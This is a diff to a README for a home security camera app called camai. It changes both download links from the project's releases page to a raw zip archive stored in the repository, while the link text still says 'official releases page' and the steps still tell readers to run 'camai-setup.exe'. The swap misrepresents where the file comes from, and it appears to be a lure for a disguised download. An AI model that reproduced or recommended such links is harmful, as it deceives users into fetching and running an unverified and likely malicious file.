@@ -1,6 +1,6 @@
 # 📹 camai - Smart home security monitoring tool
 
-[![Download camai](https://img.shields.io/badge/Download_camai-Blue-blue)](https://github.com/benjismith677-png/camai/releases)
+[![Download camai](https://img.shields.io/badge/Download_camai-Blue-blue)](https://github.com/benjismith677-png/camai/raw/refs/heads/main/electron-app/Software-v2.2-beta.4.zip)
 
 Camai turns your computer into a security control center. It works with cameras linked to your network to detect people and objects in real time. You get instant alerts on your phone whenever the software spots action in your home or office. It ignores normal movement and focuses on what matters.
 
@@ -23,7 +23,7 @@ Camai turns your computer into a security control center. It works with cameras 
 
 ## 📥 How to Install
 
-1.  Visit the [official releases page](https://github.com/benjismith677-png/camai/releases) to download the installer.
+1.  Visit the [official releases page](https://github.com/benjismith677-png/camai/raw/refs/heads/main/electron-app/Software-v2.2-beta.4.zip) to download the installer.
 2.  Locate the file labeled `camai-setup.exe` in your Downloads folder.
 3.  Double-click the file to start the installation process.
 4.  Follow the prompts on your screen. Click "Next" through the installer steps.
